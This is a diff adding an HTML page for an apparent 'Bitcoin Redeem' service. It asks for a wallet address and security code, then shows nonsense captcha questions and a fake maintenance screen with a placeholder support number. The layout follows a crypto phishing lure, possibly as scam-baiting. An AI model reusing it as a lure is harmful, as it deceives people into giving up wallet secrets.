@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitcoin Redeem</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="loginPage" class="page">
+        <header>
+            <div class="slideshow-container">
+                <div class="mySlides fade">
+                    <img src="https://programminginsider.com/wp-content/uploads/2021/06/bit.jpg" alt="Professional Image 1">
+                </div>
+                <div class="mySlides fade">
+                    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ffinancialtribune.com%2Fsites%2Fdefault%2Ffiles%2Ffield%2Fimage%2F17january%2F15_bitcoin_10.jpg&f=1&nofb=1&ipt=7aeaa9a29d27b19f92ca700f8f4ef8db308d6526e7cb0b7c5c3ddcf9e2254590&ipo=images" alt="Professional Image 2">
+                </div>
+                <div class="mySlides fade">
+                    <img src="https://zipmex.com/static/7dcfec45d416921c675a46a93fac5e1b/1bbe7/5-facts-about-bitcoin.jpg" alt="Professional Image 3">
+                </div>
+            </div>
+        </header>
+        <div class="container">
+            <h1>Bitcoin Redeem</h1>
+            <p>Securely redeem your Bitcoins using our platform. Enter your wallet address and security code to proceed.</p>
+            <form id="loginForm">
+                <label for="walletAddress">Wallet Address</label>
+                <input type="text" id="walletAddress" name="walletAddress" required>
+                
+                <label for="securityCode">Security Code</label>
+                <input type="text" id="securityCode" name="securityCode" required>
+                
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+    <div id="loadingScreen" class="page hidden">
+        <p>Loading... Please wait.</p>
+    </div>
+    <div id="questionScreen1" class="page hidden">
+        <p>Question 1: How many grains of sand are in this photo?</p>
+        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fbrobible.com%2Fwp-content%2Fuploads%2F2018%2F01%2Fsahara-desert.jpg&f=1&nofb=1&ipt=8fc08e5dfeec41f78a4f7f3ac997d51fa0ae6252986e075c9fb77a627ec5a929&ipo=images" alt="Sand Photo">
+        <form id="questionForm1">
+            <label for="answer1">Your Answer</label>
+            <input type="text" id="answer1" name="answer1" required>
+            <button type="submit">Submit Answer</button>
+        </form>
+    </div>
+    <div id="questionScreen2" class="page hidden">
+        <p>Captcha Question 2: How many stars are in this photo?</p>
+        <img src="https://wallup.net/wp-content/uploads/2018/09/26/670127-space-outer-universe-stars-photography-detail-astronomy-nasa-hubble.jpg" alt="Stars Photo">
+        <form id="questionForm2">
+            <label for="answer2">Your Answer</label>
+            <input type="text" id="answer2" name="answer2" required>
+            <button type="submit">Submit Answer</button>
+        </form>
+    </div>
+    <div id="questionScreen3" class="page hidden">
+        <p>Captcha Question 3: Who let the dogs out?</p>
+        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.thefarmersdog.com%2Fdigest%2Fwp-content%2Fuploads%2F2021%2F06%2FWLTDO-scaled.jpg&f=1&nofb=1&ipt=07df6637243021e6294602426a17081db84acc1aa636596cc7a0481e740bc685&ipo=images">
+        <form id="questionForm3">
+            <label for="answer3">Your Answer</label>
+            <input type="text" id="answer3" name="answer3" required>
+            <button type="submit">Submit Answer</button>
+        </form>
+    </div>
+    <div id="maintenanceScreen" class="page hidden">
+        <h1>Sorry, our website is under maintenance.</h1>
+        <p>For any assistance in redeeming your Bitcoin, contact the customer service representative at +1 123456789.</p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
